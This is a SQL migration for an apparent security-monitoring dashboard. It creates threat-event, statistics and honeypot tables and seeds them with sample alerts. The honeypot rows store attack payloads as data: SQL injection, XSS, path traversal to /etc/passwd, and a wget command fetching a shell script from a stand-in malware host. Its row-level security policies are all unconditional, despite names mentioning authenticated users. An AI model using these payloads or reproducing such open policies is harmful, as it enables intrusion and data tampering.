
-- threat_events table
CREATE TABLE public.threat_events (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  alert_id TEXT NOT NULL,
  type TEXT NOT NULL,
  module TEXT NOT NULL,
  risk_level TEXT NOT NULL DEFAULT 'low',
  confidence INTEGER NOT NULL DEFAULT 50,
  explanation TEXT,
  source_ip TEXT,
  status TEXT NOT NULL DEFAULT 'active',
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.threat_events ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Anyone can read threat_events" ON public.threat_events FOR SELECT USING (true);
CREATE POLICY "Authenticated users can insert threat_events" ON public.threat_events FOR INSERT WITH CHECK (true);
CREATE POLICY "Authenticated users can update threat_events" ON public.threat_events FOR UPDATE USING (true);

-- threat_stats table
CREATE TABLE public.threat_stats (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  total_threats INTEGER NOT NULL DEFAULT 0,
  blocked_attacks INTEGER NOT NULL DEFAULT 0,
  active_alerts INTEGER NOT NULL DEFAULT 0,
  risk_score INTEGER NOT NULL DEFAULT 0,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.threat_stats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Anyone can read threat_stats" ON public.threat_stats FOR SELECT USING (true);
CREATE POLICY "Authenticated users can update threat_stats" ON public.threat_stats FOR UPDATE USING (true);
CREATE POLICY "Authenticated users can insert threat_stats" ON public.threat_stats FOR INSERT WITH CHECK (true);

-- honeypot_events table
CREATE TABLE public.honeypot_events (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  ip_address TEXT NOT NULL,
  payload TEXT,
  attempt_type TEXT NOT NULL,
  attempts INTEGER NOT NULL DEFAULT 1,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.honeypot_events ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Anyone can read honeypot_events" ON public.honeypot_events FOR SELECT USING (true);
CREATE POLICY "Authenticated users can insert honeypot_events" ON public.honeypot_events FOR INSERT WITH CHECK (true);

-- Enable realtime for all three tables
ALTER PUBLICATION supabase_realtime ADD TABLE public.threat_events;
ALTER PUBLICATION supabase_realtime ADD TABLE public.threat_stats;
ALTER PUBLICATION supabase_realtime ADD TABLE public.honeypot_events;

-- Seed threat_stats with initial data
INSERT INTO public.threat_stats (total_threats, blocked_attacks, active_alerts, risk_score)
VALUES (1247, 1089, 23, 72);

-- Seed threat_events with initial data
INSERT INTO public.threat_events (alert_id, type, module, risk_level, confidence, explanation, source_ip, status, created_at) VALUES
  ('ALT-001', 'DDoS Attack', 'IDS', 'critical', 97, 'Massive volumetric flood detected from botnet cluster. 15,000+ SYN packets/sec targeting port 443.', '185.220.xxx.xxx', 'active', '2026-02-22T14:32:00Z'),
  ('ALT-002', 'Phishing URL', 'Phishing', 'high', 92, 'Suspicious URL contains encoded redirect, mimics banking portal. Domain registered 2 hours ago.', '91.134.xxx.xxx', 'active', '2026-02-22T14:28:00Z'),
  ('ALT-003', 'Zero-Day Anomaly', 'Anomaly', 'high', 78, 'Unknown traffic pattern deviates 4.2σ from baseline. Protocol behavior not matching any known signature.', '103.75.xxx.xxx', 'investigating', '2026-02-22T14:15:00Z'),
  ('ALT-004', 'Brute Force', 'IDS', 'medium', 95, '847 failed SSH login attempts in 5 minutes from single source. Credential stuffing pattern detected.', '45.33.xxx.xxx', 'active', '2026-02-22T13:50:00Z'),
  ('ALT-005', 'Malware Detected', 'Malware', 'critical', 99, 'PE binary with obfuscated payload matched EMBER signatures. Gradient Boosting classifier flagged as Trojan.', '194.26.xxx.xxx', 'active', '2026-02-22T13:42:00Z'),
  ('ALT-006', 'Abnormal Login', 'UBA', 'medium', 84, 'User logged in from unrecognized device in unusual geolocation. 3,200km from last known location.', '78.46.xxx.xxx', 'investigating', '2026-02-22T13:30:00Z'),
  ('ALT-007', 'Honeypot Triggered', 'Honeypot', 'high', 100, 'Attacker attempted SQL injection on decoy login endpoint. Payload captured and logged for analysis.', '162.247.xxx.xxx', 'resolved', '2026-02-22T13:10:00Z'),
  ('ALT-008', 'Port Scan', 'IDS', 'low', 88, 'Sequential port scanning detected across 1,024 ports. Reconnaissance activity from known Tor exit node.', '51.15.xxx.xxx', 'ignored', '2026-02-22T12:55:00Z');

-- Seed honeypot_events
INSERT INTO public.honeypot_events (ip_address, payload, attempt_type, attempts, created_at) VALUES
  ('162.247.xxx.xxx', ''' OR 1=1 --', 'SQL Injection', 14, '2026-02-22T13:10:00Z'),
  ('185.220.xxx.xxx', '<script>alert(1)</script>', 'XSS', 7, '2026-02-22T12:45:00Z'),
  ('91.134.xxx.xxx', '../../etc/passwd', 'Path Traversal', 22, '2026-02-22T11:30:00Z'),
  ('103.75.xxx.xxx', 'admin:admin123', 'Credential Stuffing', 156, '2026-02-22T10:15:00Z'),
  ('45.33.xxx.xxx', 'wget http://malware.site/shell.sh', 'Remote Code Exec', 3, '2026-02-22T09:00:00Z');
